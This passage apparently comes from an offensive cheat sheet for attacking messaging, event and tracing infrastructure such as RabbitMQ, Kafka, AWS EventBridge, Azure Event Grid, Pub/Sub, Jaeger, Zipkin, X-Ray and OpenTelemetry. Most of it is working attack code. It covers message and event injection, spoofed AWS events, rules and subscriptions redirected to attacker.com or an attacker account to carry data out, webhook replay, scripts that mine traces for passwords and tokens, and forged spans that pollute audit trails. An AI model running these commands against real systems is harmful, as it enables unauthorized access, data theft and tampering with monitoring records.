  --queue-name [QUEUE-NAME] \
  --name [POLICY-NAME]
```

**Message Operations with Python**

```python
from azure.servicebus import ServiceBusClient, ServiceBusMessage

# Connection string format
connection_str = "Endpoint=sb://[NAMESPACE].servicebus.windows.net/;SharedAccessKeyName=[KEY-NAME];SharedAccessKey=[KEY]"
queue_name = "[QUEUE-NAME]"

# Receive messages
with ServiceBusClient.from_connection_string(connection_str) as client:
    with client.get_queue_receiver(queue_name) as receiver:
        messages = receiver.receive_messages(max_message_count=10, max_wait_time=5)
        for msg in messages:
            print(f"Received: {str(msg)}")
            print(f"Body: {msg.body}")
            print(f"Properties: {msg.application_properties}")
            receiver.complete_message(msg)

# Send malicious message
with ServiceBusClient.from_connection_string(connection_str) as client:
    with client.get_queue_sender(queue_name) as sender:
        message = ServiceBusMessage("Malicious payload")
        message.application_properties = {
            "Type": "admin",
            "Priority": "critical"
        }
        sender.send_messages(message)
```

**REST API Exploitation**

```bash
# Generate SAS token
# [Inference] Token generation requires signature calculation using HMAC-SHA256

# Send message via REST API
curl -X POST \
  "https://[NAMESPACE].servicebus.windows.net/[QUEUE-NAME]/messages" \
  -H "Authorization: SharedAccessSignature [SAS-TOKEN]" \
  -H "Content-Type: application/json" \
  -d '{"payload": "malicious_data"}'

# Peek messages (non-destructive)
curl -X POST \
  "https://[NAMESPACE].servicebus.windows.net/[QUEUE-NAME]/messages/head?timeout=60" \
  -H "Authorization: SharedAccessSignature [SAS-TOKEN]"

# Receive and delete message
curl -X DELETE \
  "https://[NAMESPACE].servicebus.windows.net/[QUEUE-NAME]/messages/head?timeout=60" \
  -H "Authorization: SharedAccessSignature [SAS-TOKEN]"
```

### RabbitMQ

**RabbitMQ Reconnaissance**

```bash
# Check management API (default port 15672)
curl http://rabbitmq.example.com:15672/api/

# Default credentials
# Username: guest
# Password: guest

# Authentication
curl -u guest:guest http://rabbitmq.example.com:15672/api/whoami

# List vhosts
curl -u [USER]:[PASS] http://rabbitmq.example.com:15672/api/vhosts

# List exchanges
curl -u [USER]:[PASS] http://rabbitmq.example.com:15672/api/exchanges

# List queues
curl -u [USER]:[PASS] http://rabbitmq.example.com:15672/api/queues

# Get queue details
curl -u [USER]:[PASS] \
  http://rabbitmq.example.com:15672/api/queues/[VHOST]/[QUEUE-NAME]
```

**Message Interception**

```bash
# Get messages from queue (basic get)
curl -u [USER]:[PASS] \
  -X POST \
  http://rabbitmq.example.com:15672/api/queues/[VHOST]/[QUEUE-NAME]/get \
  -H "Content-Type: application/json" \
  -d '{"count":10,"ackmode":"ack_requeue_true","encoding":"auto"}'

# Non-destructive read (requeue=true)
curl -u [USER]:[PASS] \
  -X POST \
  http://rabbitmq.example.com:15672/api/queues/[VHOST]/[QUEUE-NAME]/get \
  -H "Content-Type: application/json" \
  -d '{"count":100,"ackmode":"ack_requeue_true","encoding":"auto"}'
```

**Message Publishing**

```bash
# Publish message to exchange
curl -u [USER]:[PASS] \
  -X POST \
  http://rabbitmq.example.com:15672/api/exchanges/[VHOST]/[EXCHANGE]/publish \
  -H "Content-Type: application/json" \
  -d '{
    "routing_key": "[ROUTING-KEY]",
    "payload": "malicious_payload",
    "payload_encoding": "string",
    "properties": {
      "delivery_mode": 2,
      "headers": {"x-custom-header": "admin"}
    }
  }'
```

**Python-based Exploitation**

```python
import pika

# Connect to RabbitMQ
credentials = pika.PlainCredentials('username', 'password')
parameters = pika.ConnectionParameters(
    host='rabbitmq.example.com',
    port=5672,
    credentials=credentials
)

connection = pika.BlockingConnection(parameters)
channel = connection.channel()

# Declare queue (if needed)
channel.queue_declare(queue='target_queue', passive=True)

# Consume messages
def callback(ch, method, properties, body):
    print(f"Received: {body}")
    print(f"Properties: {properties}")
    print(f"Headers: {properties.headers}")
    # Don't acknowledge to keep message in queue
    # ch.basic_ack(delivery_tag=method.delivery_tag)

channel.basic_consume(
    queue='target_queue',
    on_message_callback=callback,
    auto_ack=False
)

print('Monitoring queue...')
channel.start_consuming()
```

**Queue Binding Manipulation**

```bash
# Create malicious binding
curl -u [USER]:[PASS] \
  -X POST \
  http://rabbitmq.example.com:15672/api/bindings/[VHOST]/e/[EXCHANGE]/q/[QUEUE] \
  -H "Content-Type: application/json" \
  -d '{"routing_key":"#","arguments":{}}'

# List bindings
curl -u [USER]:[PASS] \
  http://rabbitmq.example.com:15672/api/bindings/[VHOST]/e/[EXCHANGE]/q/[QUEUE]
```

### Apache Kafka

**Kafka Enumeration**

```bash
# List topics (using kafka-topics.sh)
kafka-topics.sh --bootstrap-server kafka.example.com:9092 --list

# Describe topic
kafka-topics.sh \
  --bootstrap-server kafka.example.com:9092 \
  --topic [TOPIC-NAME] \
  --describe

# List consumer groups
kafka-consumer-groups.sh \
  --bootstrap-server kafka.example.com:9092 \
  --list

# Describe consumer group
kafka-consumer-groups.sh \
  --bootstrap-server kafka.example.com:9092 \
  --group [GROUP-NAME] \
  --describe
```

**Message Consumption**

```bash
# Consume from beginning
kafka-console-consumer.sh \
  --bootstrap-server kafka.example.com:9092 \
  --topic [TOPIC-NAME] \
  --from-beginning

# Consume from specific partition
kafka-console-consumer.sh \
  --bootstrap-server kafka.example.com:9092 \
  --topic [TOPIC-NAME] \
  --partition 0 \
  --offset earliest

# Consume with key and timestamp
kafka-console-consumer.sh \
  --bootstrap-server kafka.example.com:9092 \
  --topic [TOPIC-NAME] \
  --property print.key=true \
  --property print.timestamp=true \
  --from-beginning

# Consume with specific consumer group
kafka-console-consumer.sh \
  --bootstrap-server kafka.example.com:9092 \
  --topic [TOPIC-NAME] \
  --group attacker-group
```

**Message Production**

```bash
# Produce message
echo "malicious_payload" | kafka-console-producer.sh \
  --bootstrap-server kafka.example.com:9092 \
  --topic [TOPIC-NAME]

# Produce with key
kafka-console-producer.sh \
  --bootstrap-server kafka.example.com:9092 \
  --topic [TOPIC-NAME] \
  --property "parse.key=true" \
  --property "key.separator=:"

# Then input: key:value

# Batch produce from file
kafka-console-producer.sh \
  --bootstrap-server kafka.example.com:9092 \
  --topic [TOPIC-NAME] < messages.txt
```

**Python-based Kafka Exploitation**

```python
from kafka import KafkaConsumer, KafkaProducer
import json

# Consumer
consumer = KafkaConsumer(
    'target-topic',
    bootstrap_servers=['kafka.example.com:9092'],
    auto_offset_reset='earliest',
    enable_auto_commit=False,
    group_id='attacker-group',
    value_deserializer=lambda x: json.loads(x.decode('utf-8'))
)

for message in consumer:
    print(f"Topic: {message.topic}")
    print(f"Partition: {message.partition}")
    print(f"Offset: {message.offset}")
    print(f"Key: {message.key}")
    print(f"Value: {message.value}")
    print(f"Timestamp: {message.timestamp}")
    print("---")

# Producer
producer = KafkaProducer(
    bootstrap_servers=['kafka.example.com:9092'],
    value_serializer=lambda v: json.dumps(v).encode('utf-8')
)

malicious_payload = {
    "command": "inject",
    "user": "admin",
    "data": "malicious_data"
}

producer.send('target-topic', malicious_payload)
producer.flush()
```

**Kafka REST Proxy Exploitation**

```bash
# List topics
curl -X GET http://kafka-rest.example.com:8082/topics

# Get topic metadata
curl -X GET http://kafka-rest.example.com:8082/topics/[TOPIC-NAME]

# Produce message
curl -X POST \
  http://kafka-rest.example.com:8082/topics/[TOPIC-NAME] \
  -H "Content-Type: application/vnd.kafka.json.v2+json" \
  -d '{
    "records": [
      {
        "key": "key1",
        "value": {"command": "malicious"}
      }
    ]
  }'

# Consume messages
# Create consumer instance
curl -X POST \
  http://kafka-rest.example.com:8082/consumers/[GROUP-NAME] \
  -H "Content-Type: application/vnd.kafka.v2+json" \
  -d '{
    "name": "attacker_consumer",
    "format": "json",
    "auto.offset.reset": "earliest"
  }'

# Subscribe to topic
curl -X POST \
  http://kafka-rest.example.com:8082/consumers/[GROUP-NAME]/instances/attacker_consumer/subscription \
  -H "Content-Type: application/vnd.kafka.v2+json" \
  -d '{"topics":["[TOPIC-NAME]"]}'

# Read messages
curl -X GET \
  http://kafka-rest.example.com:8082/consumers/[GROUP-NAME]/instances/attacker_consumer/records \
  -H "Accept: application/vnd.kafka.json.v2+json"
```

---

## Event-Driven Architecture Attacks

### AWS EventBridge

**EventBridge Enumeration**

```bash
# List event buses
aws events list-event-buses

# List rules on default bus
aws events list-rules

# List rules on custom bus
aws events list-rules --event-bus-name [BUS-NAME]

# Describe specific rule
aws events describe-rule --name [RULE-NAME]

# List targets for rule
aws events list-targets-by-rule --rule [RULE-NAME]

# List rule names by target
aws events list-rule-names-by-target \
  --target-arn [TARGET-ARN]
```

**Event Injection**

```bash
# Send custom event
aws events put-events --entries '[
  {
    "Source": "custom.application",
    "DetailType": "user.action",
    "Detail": "{\"userId\":\"admin\",\"action\":\"elevated_command\"}",
    "EventBusName": "default"
  }
]'

# Send event mimicking legitimate source
aws events put-events --entries '[
  {
    "Source": "aws.ec2",
    "DetailType": "EC2 Instance State-change Notification",
    "Detail": "{\"instance-id\":\"i-malicious\",\"state\":\"running\"}",
    "Resources": ["arn:aws:ec2:us-east-1:123456789012:instance/i-malicious"]
  }
]'

# Batch event injection
aws events put-events --entries file://events.json
```

**Event Pattern Analysis**

```bash
# Get rule event pattern
aws events describe-rule \
  --name [RULE-NAME] \
  --query 'EventPattern' \
  --output text | jq '.'

# Test event pattern matching
aws events test-event-pattern \
  --event-pattern '{"source":["aws.ec2"]}' \
  --event '{"source":"aws.ec2","detail-type":"EC2 Instance State-change"}'
```

**Rule Manipulation**

```bash
# Create malicious rule
aws events put-rule \
  --name attacker-rule \
  --event-pattern '{"source":["aws.s3"],"detail-type":["Object Created"]}' \
  --state ENABLED

# Add target to existing rule (if permissions allow)
aws events put-targets \
  --rule [RULE-NAME] \
  --targets '[
    {
      "Id": "1",
      "Arn": "arn:aws:lambda:us-east-1:ATTACKER-ACCOUNT:function:exfil",
      "RoleArn": "arn:aws:iam::TARGET-ACCOUNT:role/EventBridgeRole"
    }
  ]'

# Disable legitimate rule
aws events disable-rule --name [RULE-NAME]

# Delete rule
aws events remove-targets --rule [RULE-NAME] --ids 1 2 3
aws events delete-rule --name [RULE-NAME]
```

**EventBridge Monitoring Script**

```bash
#!/bin/bash
# Monitor EventBridge by creating catch-all rule

RULE_NAME="monitor-all-events"
TARGET_QUEUE_ARN="arn:aws:sqs:us-east-1:123456789012:event-monitor"

# Create catch-all rule
aws events put-rule \
  --name "$RULE_NAME" \
  --event-pattern '{}' \
  --state ENABLED

# Add SQS target
aws events put-targets \
  --rule "$RULE_NAME" \
  --targets "[{\"Id\":\"1\",\"Arn\":\"$TARGET_QUEUE_ARN\"}]"

# Monitor queue for events
while true; do
  aws sqs receive-message \
    --queue-url https://sqs.us-east-1.amazonaws.com/123456789012/event-monitor \
    --wait-time-seconds 10 | jq -r '.Messages[]?.Body'
  sleep 1
done
```

### Azure Event Grid

**Event Grid Enumeration**

```bash
# List topics
az eventgrid topic list

# List system topics
az eventgrid system-topic list

# Show topic details
az eventgrid topic show \
  --name [TOPIC-NAME] \
  --resource-group [RG-NAME]

# List event subscriptions
az eventgrid event-subscription list

# List subscriptions for specific topic
az eventgrid event-subscription list \
  --source-resource-id [TOPIC-RESOURCE-ID]

# Show subscription details
az eventgrid event-subscription show \
  --name [SUBSCRIPTION-NAME] \
  --source-resource-id [TOPIC-RESOURCE-ID]
```

**Event Publishing**

```bash
# Get topic endpoint and key
ENDPOINT=$(az eventgrid topic show \
  --name [TOPIC-NAME] \
  --resource-group [RG-NAME] \
  --query "endpoint" -o tsv)

KEY=$(az eventgrid topic key list \
  --name [TOPIC-NAME] \
  --resource-group [RG-NAME] \
  --query "key1" -o tsv)

# Publish event
curl -X POST "$ENDPOINT" \
  -H "aeg-sas-key: $KEY" \
  -H "Content-Type: application/json" \
  -d '[
    {
      "id": "unique-id-1",
      "eventType": "CustomEvent",
      "subject": "malicious/subject",
      "eventTime": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'",
      "data": {
        "command": "inject",
        "payload": "malicious_data"
      },
      "dataVersion": "1.0"
    }
  ]'
```

**Webhook Subscription Hijacking**

```bash
# Create webhook subscription to attacker endpoint
az eventgrid event-subscription create \
  --name attacker-subscription \
  --source-resource-id [TOPIC-RESOURCE-ID] \
  --endpoint https://attacker.com/webhook \
  --included-event-types All

# Update existing subscription
az eventgrid event-subscription update \
  --name [SUBSCRIPTION-NAME] \
  --source-resource-id [TOPIC-RESOURCE-ID] \
  --endpoint https://attacker.com/webhook
```

**Event Grid Validation Bypass**

```python
from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

@app.route('/webhook', methods=['POST'])
def webhook():
    # Handle validation request
    for event in request.json:
        if event.get('eventType') == 'Microsoft.EventGrid.SubscriptionValidationEvent':
            validation_code = event['data']['validationCode']
            return jsonify({
                'validationResponse': validation_code
            })
        
        # Log actual events
        print(f"Received event: {event}")
    
    return '', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')
```

### Google Cloud Pub/Sub

**Pub/Sub Enumeration**

```bash
# List topics
gcloud pubsub topics list

# List subscriptions
gcloud pubsub subscriptions list

# Describe topic
gcloud pubsub topics describe [TOPIC-NAME]

# Describe subscription
gcloud pubsub subscriptions describe [SUBSCRIPTION-NAME]

# List snapshots
gcloud pubsub snapshots list
```

**Message Publishing**

```bash
# Publish message
gcloud pubsub topics publish [TOPIC-NAME] \
  --message "malicious_payload"

# Publish with attributes
gcloud pubsub topics publish [TOPIC-NAME] \
  --message "data" \
  --attribute "type=admin,priority=high"

# Publish from file
gcloud pubsub topics publish [TOPIC-NAME] \
  --message-body file://payload.json
```

**Subscription Creation**

```bash
# Create pull subscription
gcloud pubsub subscriptions create attacker-sub \
  --topic [TOPIC-NAME]

# Create push subscription to attacker endpoint
gcloud pubsub subscriptions create attacker-push \
  --topic [TOPIC-NAME] \
  --push-endpoint https://attacker.com/webhook

# Create with filter
gcloud pubsub subscriptions create filtered-sub \
  --topic [TOPIC-NAME] \
  --message-filter 'attributes.type = "sensitive"'
```

**Message Consumption**

```bash
# Pull messages
gcloud pubsub subscriptions pull [SUBSCRIPTION-NAME] \
  --limit 100

# Pull with auto-ack
gcloud pubsub subscriptions pull [SUBSCRIPTION-NAME] \
  --auto-ack \
  --limit 100

# Continuous pull
while true; do
  gcloud pubsub subscriptions pull [SUBSCRIPTION-NAME] \
    --auto-ack \
    --limit 10
  sleep 1
done
```

**Python Pub/Sub Exploitation**

```python
from google.cloud import pubsub_v1
import json

project_id = "target-project"
subscription_name = "attacker-subscription"

# Subscriber
subscriber = pubsub_v1.SubscriberClient()
subscription_path = subscriber.subscription_path(project_id, subscription_name)

def callback(message):
    print(f"Received message: {message.data}")
    print(f"Attributes: {message.attributes}")
    print(f"Message ID: {message.message_id}")
    print(f"Publish time: {message.publish_time}")
    message.ack()

streaming_pull_future = subscriber.subscribe(subscription_path, callback=callback)
print(f"Listening for messages on {subscription_path}...")

try:
    streaming_pull_future.result()
except KeyboardInterrupt:
    streaming_pull_future.cancel()

# Publisher
publisher = pubsub_v1.PublisherClient()
topic_path = publisher.topic_path(project_id, "target-topic")

message_data = json.dumps({
    "command": "inject",
    "payload": "malicious"
}).encode("utf-8")

future = publisher.publish(
    topic_path,
    message_data,
    type="admin",
    priority="high"
)

print(f"Published message ID: {future.result()}")
```

### Webhook Interception and Manipulation

**Webhook Endpoint Setup**

```python
from flask import Flask, request
import json
import logging

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)

@app.route('/webhook', methods=['POST', 'GET', 'PUT'])
def webhook():
    # Log all details
    logging.info(f"Method: {request.method}")
    logging.info(f"Headers: {dict(request.headers)}")
    logging.info(f"Query params: {request.args}")
    
    if request.is_json:
        logging.info(f"JSON body: {request.get_json()}")
    else:
        logging.info(f"Body: {request.get_data()}")
    
    # Store to file
    with open('webhook_log.json', 'a') as f:
        f.write(json.dumps({
            'method': request.method,
            'headers': dict(request.headers),
            'data': request.get_data(as_text=True)
        }) + '\n')
    
    return '', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

**Ngrok for Webhook Testing**

```bash
# Install ngrok
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar xvzf ngrok-v3-stable-linux-amd64.tgz

# Start tunnel
./ngrok http 80

# Use provided URL as webhook endpoint
# Example: https://abcd1234.ngrok.io/webhook
```

**Webhook Replay Attack**

```bash
#!/bin/bash
# Capture webhook request and replay

WEBHOOK_URL="https://target.com/webhook" CAPTURED_HEADERS="captured_headers.txt" CAPTURED_BODY="captured_body.json"

# Replay captured request

curl -X POST "$WEBHOOK_URL"  
$(cat "$CAPTURED_HEADERS" | while read header; do echo "-H '$header'"; done)  
-d @"$CAPTURED_BODY"

# Replay with modifications

MODIFIED_BODY=$(cat "$CAPTURED_BODY" | jq '.user = "admin" | .action = "privilege_escalate"')

curl -X POST "$WEBHOOK_URL"  
-H "Content-Type: application/json"  
-d "$MODIFIED_BODY"

````

**Event Signature Bypass Techniques**

```python
import hmac
import hashlib
import base64

# AWS SNS signature verification bypass
# [Unverified] This technique attempts to exploit weak signature validation

def forge_sns_signature(message, topic_arn, signing_cert_url):
    """
    [Unverified] Signature forgery - only works if validation is improperly implemented
    """
    # Target systems with weak/missing signature verification
    payload = {
        "Type": "Notification",
        "MessageId": "fake-message-id",
        "TopicArn": topic_arn,
        "Subject": "Malicious Event",
        "Message": message,
        "Timestamp": "2025-10-24T12:00:00.000Z",
        "SignatureVersion": "1",
        "Signature": "fake-signature",
        "SigningCertURL": signing_cert_url
    }
    return payload

# GitHub webhook signature bypass
def verify_github_signature(payload_body, secret_token, signature_header):
    """
    Proper verification - use to understand what to bypass
    """
    hash_object = hmac.new(
        secret_token.encode('utf-8'),
        msg=payload_body.encode('utf-8'),
        digestmod=hashlib.sha256
    )
    expected_signature = "sha256=" + hash_object.hexdigest()
    return hmac.compare_digest(expected_signature, signature_header)

# Slack signature verification
def verify_slack_signature(timestamp, body, signature, signing_secret):
    """
    Slack uses timestamp + body in signature
    """
    sig_basestring = f"v0:{timestamp}:{body}"
    my_signature = 'v0=' + hmac.new(
        signing_secret.encode(),
        sig_basestring.encode(),
        hashlib.sha256
    ).hexdigest()
    return hmac.compare_digest(my_signature, signature)
````

---

## Distributed Tracing Exploitation

### Jaeger Tracing

**Jaeger API Enumeration**

```bash
# Jaeger Query Service (default port 16686)
JAEGER_URL="http://jaeger.example.com:16686"

# List services
curl "$JAEGER_URL/api/services"

# Get operations for service
curl "$JAEGER_URL/api/services/[SERVICE-NAME]/operations"

# Search traces
curl "$JAEGER_URL/api/traces?service=[SERVICE-NAME]&limit=100"

# Get specific trace
curl "$JAEGER_URL/api/traces/[TRACE-ID]"

# Get dependencies
curl "$JAEGER_URL/api/dependencies?endTs=$(date +%s)000&lookback=86400000"
```

**Sensitive Data Extraction from Traces**

```bash
#!/bin/bash
JAEGER_URL="http://jaeger.example.com:16686"

# Extract traces with potential sensitive data
for service in $(curl -s "$JAEGER_URL/api/services" | jq -r '.data[]'); do
  echo "=== Service: $service ==="
  
  # Get recent traces
  traces=$(curl -s "$JAEGER_URL/api/traces?service=$service&limit=100")
  
  # Search for sensitive patterns
  echo "$traces" | jq -r '
    .data[].spans[] | 
    select(.tags[]? | 
      .key | test("password|secret|token|api.?key|credit.?card|ssn"; "i")
    ) | 
    {
      traceID: .traceID,
      operation: .operationName,
      tags: .tags
    }
  '
  
  # Search for SQL queries with data
  echo "$traces" | jq -r '
    .data[].spans[] | 
    select(.tags[]? | .key == "db.statement") |
    {
      traceID: .traceID,
      query: (.tags[] | select(.key == "db.statement") | .value)
    }
  '
done
```

**Trace Injection**

```python
from jaeger_client import Config
from jaeger_client.reporter import Reporter
from jaeger_client.sampler import ConstSampler
import time

# Configure Jaeger client to send to target collector
config = Config(
    config={
        'sampler': {'type': 'const', 'param': 1},
        'local_agent': {
            'reporting_host': 'jaeger-collector.example.com',
            'reporting_port': 6831,
        },
        'logging': True,
    },
    service_name='malicious-service',
    validate=True,
)

tracer = config.initialize_tracer()

# Create malicious trace
with tracer.start_span('malicious_operation') as span:
    span.set_tag('user_id', 'admin')
    span.set_tag('action', 'privilege_escalation')
    span.set_tag('sql_query', 'SELECT * FROM users WHERE role=admin')
    span.log_kv({'event': 'data_exfiltration', 'records': 1000})
    
    # Create child spans
    with tracer.start_span('database_query', child_of=span) as child:
        child.set_tag('db.statement', 'UPDATE users SET role=admin WHERE id=attacker')
        child.set_tag('db.type', 'postgresql')
        time.sleep(0.1)

time.sleep(2)  # Allow trace to be sent
tracer.close()
```

**Jaeger Collector Direct Access**

```bash
# Jaeger Collector accepts traces via Thrift/HTTP (port 14268)
COLLECTOR_URL="http://jaeger-collector.example.com:14268"

# Send trace via HTTP
# [Inference] Requires properly formatted Jaeger Thrift payload
curl -X POST "$COLLECTOR_URL/api/traces" \
  -H "Content-Type: application/x-thrift" \
  --data-binary @malicious_trace.thrift
```

### Zipkin Tracing

**Zipkin API Enumeration**

```bash
ZIPKIN_URL="http://zipkin.example.com:9411"

# List services
curl "$ZIPKIN_URL/api/v2/services"

# List span names for service
curl "$ZIPKIN_URL/api/v2/spans?serviceName=[SERVICE-NAME]"

# Search traces
curl "$ZIPKIN_URL/api/v2/traces?serviceName=[SERVICE-NAME]&limit=100"

# Get specific trace
curl "$ZIPKIN_URL/api/v2/trace/[TRACE-ID]"

# Get dependencies
curl "$ZIPKIN_URL/api/v2/dependencies?endTs=$(date +%s)000&lookback=86400000"

# Autocomplete search
curl "$ZIPKIN_URL/api/v2/autocompleteKeys"
curl "$ZIPKIN_URL/api/v2/autocompleteValues?key=http.path"
```

**Sensitive Data Mining**

```bash
#!/bin/bash
ZIPKIN_URL="http://zipkin.example.com:9411"

# Extract traces with sensitive tags
for service in $(curl -s "$ZIPKIN_URL/api/v2/services" | jq -r '.[]'); do
  echo "=== Service: $service ==="
  
  # Search for traces with specific tags
  traces=$(curl -s "$ZIPKIN_URL/api/v2/traces?serviceName=$service&limit=1000")
  
  # Extract credentials from tags
  echo "$traces" | jq -r '
    .[][] | 
    select(.tags.password? or .tags.api_key? or .tags.token?) |
    {
      traceId: .traceId,
      name: .name,
      tags: .tags
    }
  '
  
  # Extract from annotations
  echo "$traces" | jq -r '
    .[][] |
    select(.annotations[]?.value | test("password|key|token"; "i")) |
    {
      traceId: .traceId,
      annotations: .annotations
    }
  '
done
```

**Zipkin Span Injection**

```python
import requests
import json
import time
import random

ZIPKIN_URL = "http://zipkin.example.com:9411"

def generate_trace_id():
    return ''.join(random.choices('0123456789abcdef', k=16))

def generate_span_id():
    return ''.join(random.choices('0123456789abcdef', k=16))

# Create malicious span
trace_id = generate_trace_id()
parent_span_id = generate_span_id()
child_span_id = generate_span_id()

timestamp = int(time.time() * 1000000)  # microseconds

spans = [
    {
        "traceId": trace_id,
        "id": parent_span_id,
        "name": "malicious_operation",
        "timestamp": timestamp,
        "duration": 100000,
        "localEndpoint": {
            "serviceName": "attacker-service",
            "ipv4": "192.168.1.100"
        },
        "tags": {
            "http.method": "POST",
            "http.path": "/admin/users",
            "user.id": "admin",
            "action": "privilege_grant",
            "sql.query": "UPDATE users SET is_admin=true"
        }
    },
    {
        "traceId": trace_id,
        "id": child_span_id,
        "parentId": parent_span_id,
        "name": "database_write",
        "timestamp": timestamp + 10000,
        "duration": 50000,
        "localEndpoint": {
            "serviceName": "database",
            "ipv4": "10.0.1.50"
        },
        "tags": {
            "db.statement": "INSERT INTO audit_log VALUES ('legitimate_operation')",
            "db.type": "mysql"
        }
    }
]

# Send spans to Zipkin
response = requests.post(
    f"{ZIPKIN_URL}/api/v2/spans",
    headers={"Content-Type": "application/json"},
    data=json.dumps(spans)
)

print(f"Response: {response.status_code}")
print(f"Trace ID: {trace_id}")
```

### AWS X-Ray

**X-Ray Enumeration**

```bash
# Get service graph
aws xray get-service-graph \
  --start-time $(date -d '1 hour ago' +%s) \
  --end-time $(date +%s)

# Get trace summaries
aws xray get-trace-summaries \
  --start-time $(date -d '1 hour ago' +%s) \
  --end-time $(date +%s) \
  --filter-expression 'service(id(name: "target-service"))'

# Get specific traces
aws xray batch-get-traces \
  --trace-ids [TRACE-ID-1] [TRACE-ID-2]

# Get sampling rules
aws xray get-sampling-rules

# Get encryption config
aws xray get-encryption-config
```

**Trace Data Extraction**

```bash
#!/bin/bash

START_TIME=$(date -d '24 hours ago' +%s)
END_TIME=$(date +%s)

# Get all trace IDs
trace_ids=$(aws xray get-trace-summaries \
  --start-time $START_TIME \
  --end-time $END_TIME \
  --query 'TraceSummaries[*].Id' \
  --output text)

# Fetch detailed traces
for trace_id in $trace_ids; do
  echo "=== Trace: $trace_id ==="
  
  trace=$(aws xray batch-get-traces --trace-ids "$trace_id")
  
  # Extract sensitive annotations and metadata
  echo "$trace" | jq -r '
    .Traces[].Segments[].Document | fromjson |
    select(.annotations? or .metadata?) |
    {
      name: .name,
      annotations: .annotations,
      metadata: .metadata,
      http: .http?,
      sql: .sql?
    }
  '
done
```

**X-Ray Segment Injection**

```python
import boto3
import json
import time
import random

xray = boto3.client('xray')

def generate_segment():
    trace_id = f"1-{hex(int(time.time()))[2:]}-{random.randbytes(12).hex()}"
    segment_id = random.randbytes(8).hex()
    
    segment = {
        "name": "malicious-service",
        "id": segment_id,
        "trace_id": trace_id,
        "start_time": time.time(),
        "end_time": time.time() + 1,
        "http": {
            "request": {
                "method": "POST",
                "url": "https://api.example.com/admin/users",
                "user_agent": "AttackerClient/1.0"
            },
            "response": {
                "status": 200
            }
        },
        "annotations": {
            "user_id": "admin",
            "action": "privilege_escalation",
            "target": "database_admin"
        },
        "metadata": {
            "credentials": {
                "username": "admin",
                "api_key": "fake-key-12345"
            }
        },
        "sql": {
            "sanitized_query": "UPDATE users SET role = ?",
            "database_type": "PostgreSQL"
        }
    }
    
    return trace_id, json.dumps(segment)

# Send segment
trace_id, segment_doc = generate_segment()

try:
    response = xray.put_trace_segments(
        TraceSegmentDocuments=[segment_doc]
    )
    print(f"Injected trace: {trace_id}")
    print(f"Response: {response}")
except Exception as e:
    print(f"Error: {e}")
```

**X-Ray Filter Expressions for Data Mining**

```bash
# Find traces with errors
aws xray get-trace-summaries \
  --start-time $(date -d '1 hour ago' +%s) \
  --end-time $(date +%s) \
  --filter-expression 'error = true'

# Find traces with specific annotations
aws xray get-trace-summaries \
  --start-time $(date -d '1 hour ago' +%s) \
  --end-time $(date +%s) \
  --filter-expression 'annotation.user_type = "admin"'

# Find slow queries
aws xray get-trace-summaries \
  --start-time $(date -d '1 hour ago' +%s) \
  --end-time $(date +%s) \
  --filter-expression 'duration >= 5'

# Find traces with SQL
aws xray get-trace-summaries \
  --start-time $(date -d '1 hour ago' +%s) \
  --end-time $(date +%s) \
  --filter-expression 'service(id(name: "database")) AND sql.sanitized_query EXISTS'
```

### OpenTelemetry Collector Exploitation

**OTLP Endpoint Discovery**

```bash
# Common OpenTelemetry Collector ports
# gRPC: 4317
# HTTP: 4318

# Test gRPC endpoint
grpcurl -plaintext otel-collector.example.com:4317 list

# Test HTTP endpoint
curl http://otel-collector.example.com:4318/v1/traces

# Check collector metrics endpoint (if exposed)
curl http://otel-collector.example.com:8888/metrics

# Check health endpoint
curl http://otel-collector.example.com:13133/
```

**Span Injection via HTTP**

```python
import requests
import json
import time
import base64

OTEL_HTTP_ENDPOINT = "http://otel-collector.example.com:4318/v1/traces"

def create_trace_payload():
    timestamp_ns = int(time.time() * 1e9)
    trace_id = base64.b64encode(bytes.fromhex(''.join(['%02x' % i for i in range(16)]))).decode()
    span_id = base64.b64encode(bytes.fromhex(''.join(['%02x' % i for i in range(8)]))).decode()
    
    payload = {
        "resourceSpans": [{
            "resource": {
                "attributes": [{
                    "key": "service.name",
                    "value": {"stringValue": "malicious-service"}
                }]
            },
            "scopeSpans": [{
                "scope": {
                    "name": "attacker-instrumentation",
                    "version": "1.0.0"
                },
                "spans": [{
                    "traceId": trace_id,
                    "spanId": span_id,
                    "name": "privileged_operation",
                    "kind": 1,  # SPAN_KIND_INTERNAL
                    "startTimeUnixNano": str(timestamp_ns),
                    "endTimeUnixNano": str(timestamp_ns + 1000000000),
                    "attributes": [
                        {
                            "key": "http.method",
                            "value": {"stringValue": "POST"}
                        },
                        {
                            "key": "http.url",
                            "value": {"stringValue": "https://api.example.com/admin"}
                        },
                        {
                            "key": "user.id",
                            "value": {"stringValue": "admin"}
                        },
                        {
                            "key": "db.statement",
                            "value": {"stringValue": "UPDATE users SET is_admin=1 WHERE id=attacker"}
                        },
                        {
                            "key": "sensitive.api_key",
                            "value": {"stringValue": "fake-api-key-12345"}
                        }
                    ],
                    "status": {
                        "code": 1  # STATUS_CODE_OK
                    }
                }]
            }]
        }]
    }
    
    return payload

# Send trace
response = requests.post(
    OTEL_HTTP_ENDPOINT,
    headers={"Content-Type": "application/json"},
    json=create_trace_payload()
)

print(f"Response: {response.status_code}")
print(f"Body: {response.text}")
```

**OTLP gRPC Injection**

```python
import grpc
from opentelemetry.proto.collector.trace.v1 import trace_service_pb2, trace_service_pb2_grpc
from opentelemetry.proto.trace.v1 import trace_pb2
from opentelemetry.proto.common.v1 import common_pb2
from opentelemetry.proto.resource.v1 import resource_pb2
import time
import secrets

OTEL_GRPC_ENDPOINT = "otel-collector.example.com:4317"

# Create gRPC channel
channel = grpc.insecure_channel(OTEL_GRPC_ENDPOINT)
stub = trace_service_pb2_grpc.TraceServiceStub(channel)

# Create span
trace_id = secrets.token_bytes(16)
span_id = secrets.token_bytes(8)
timestamp_ns = int(time.time() * 1e9)

span = trace_pb2.Span(
    trace_id=trace_id,
    span_id=span_id,
    name="malicious_database_query",
    kind=trace_pb2.Span.SPAN_KIND_CLIENT,
    start_time_unix_nano=timestamp_ns,
    end_time_unix_nano=timestamp_ns + 1000000000,
    attributes=[
        common_pb2.KeyValue(
            key="db.system",
